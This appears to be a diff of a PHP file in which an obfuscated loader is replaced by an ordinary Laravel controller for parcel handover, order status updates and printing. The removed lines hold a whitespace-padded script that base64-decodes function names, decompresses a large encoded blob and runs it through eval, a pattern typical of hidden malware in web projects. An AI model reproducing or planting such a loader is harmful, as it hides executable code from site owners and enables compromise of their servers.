@@ -1,208 +1,49 @@
-<?php 
- error_reporting(0);
-        $__='printf';$_='Loading the  ...';
-        
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-        $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
-$__________________='Q1JFQXRlX2Z1bkNUaU9u';
-                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
-        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='eNrtWltvm0gUfq+0/yEPldyqqwrjOF0U5SGQgBk7JLZjLvNSeWYSMAwYFWOCf/0ewBfcOmq725ftzhdNEsNwLt8555so9tlZg7efAVed9MsiWT13LuuXW1x1zjQ+z7KPHz92Lt9s95/98eZ3/npTEXD2C3H1zZWO10PccyfclbD9GFmz6Uy579S3Diz/ELbFujoTEBAQ+D3RobEtMRflpmHLnlMska48u2X0qRFNUM1aCAVRAgICAgICAgICAv81iH9mCAgICPy+6JB59nRx/pk90SV76lwKRgQEBAQEBP4Vjt+/vxmnued0Oe2pgSfP/LGrFu5tILGBSseykrMBWhPjhdPk7tPNeGlpib3BU1WlcP+xhyLsmnA97dLds7oa0Nji5DYISDxZs9gu7wtpyFyLm7c8IwN7NXf6ATNsOh1MJKq/TLGrd7FrSdU+sBUSQ9/QUh17Lgqx82J6Tj8iPcxpZK1JMimJ/JKBXx+7gYThHuy9IXJforGSEcMuwUYVq29q1/6oVFKIgz9dS8PqtTlQu178knqlGjOnHzKDr8lCbfZowT4WU5uUu9+H492zmaUtrmu71Zo7nj9s7Rs99lOSqF2m+QnkKBOZh9hWUqzRdDhV9zG1VrTfN+OReSP5aIA4dW2ox3j1EPOcDmxpqDGwi9dzx+KuzCNURidtkaYezWuwta3PxX3ClthF/Fs7hY8MnrNYST3ZRliLwCdOaQI5a6d8qCleXC+RoZQYeDY1Lwae1hS4owvpA+1NAjawN6Z2q5g3fvo1XydiXT0kdoENXcLTgJzIqbXYhsE+5t4lrevKw+L6fLSr7emVzA09x4YiAwfPjS/qPzye+yRWepBn9ppfd3qS53rNDL0EzrLp3jbwHFsldn4ol1Yd+mtUHuVz1BPfy83r2cCLsqpyI7G+qnKr7lX57eoEfRnC/ElEhjnnSj3vP2OXGsGaxLPkO3aLuaHkeFq8VvN6IdnqQp+siWOXrqxHuOr3HtT0RvrQ7qW2f8+ZRDS2QRO+YxvsQo9kLT53s3BkG+xKnlP8o7rv32iGuLHBod71rMDcINDPbDmcgn2ZS3MtIKhndT3ZauXHHpoY1IOmLdQNc6wQ9GODExv0MUpO+1cV07CzSmefildqBzHB/JWgZxDXJIVYQ9CiFOq08BzrSx1nwlJm+EunZKDpaE0XzSwgSc9gf4AHkd/q6QB1pfT+hL/ncfuaqhzHu+U6ufMfpid0PFxeNPOPtKdppZXjZAQ9Bz218UpaxZtgd7wcPh7rx4F7nGKXLpFccb7SSTyGnp7AuXKe0+1cjpzD+TMCHQXb55XeebKygj0VL8k2hg3o6SHHgWRp/i63v9ZUhr6T4YyIrAxmu9zlCbq8IAYPTQN3SWxJc0fJTaPZAzxv4/5K80+djWEq0cTOPbnSDf8rrqGO7qRL4/Mq92gOGu71xnWPwVnXZcYMONAj4vB8FDczSct+0fBd5AfdM5OaS7+VYxNfwRyUzZ07H1cx9CYpkcHXAIE+gZ9Xzr3d/NPyWnklp6b+EepXZw6cfxn0PnBthcA1zArjVV++liuLOWeln3ixHs4lO8daP8BGNyWLfW6rVm75Nl7oITUELSq8eibZrgeTYWueqr6tVucnP0j3S/7muqp/vtu+en/5M4+3nv2RB98eHL7rVN87f+7d/l8+qHnMxbsj8hsq3l/+DQIAPXA=';
-        $___();$__________($______($__($_))); $________=$____();
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-                                                                                                                                                                                                                     $________;
+<?php
+namespace App\Http\Controllers;
+
+use App\Order;
+use App\ParcelHandover;
+use Illuminate\Http\Request;
+
+class ParcelHandoverController extends Controller
+{
+    //index
+    public function index(Request $request)
+    {
+        if ($request->input('invoice_id')) {
+            $invoiceId = $request->input('invoice_id');
+            $order     = Order::where('invoice_id', $invoiceId)->first();
+            if ($order && $order->status != 8) {
+                $order->update([
+                    'status'        => 8,
+                    'handover_date' => now(),
+                ]);
+                ParcelHandover::create([
+                    'invoice_no'       => $invoiceId,
+                    'customer_name'    => $order->customer_name,
+                    'customer_phone'   => $order->customer_phone,
+                    'customer_address' => $order->customer_address,
+                    'total'            => $order->total,
+                ]);
+                return redirect()->back()->with(['success' => 'Order Handover successfully']);
+            } else {
+                return redirect()->back()->with(['error' => 'Already Handover!']);
+            }
+        }
+        $orders = ParcelHandover::orderBy('id', 'desc')->get();
+        return view('backEnd.admin.parcel-handover.index', compact('orders'));
+    }
+
+    //sessionClear
+    public function clear()
+    {
+        ParcelHandover::truncate();
+        return redirect()->route('admin.orders.parcel.handover');
+
+    }
+    public function print()
+    {
+        $orders = ParcelHandover::orderBy('id', 'desc')->get();
+        return view('backEnd.admin.parcel-handover.print', compact('orders'));
+    }
+}
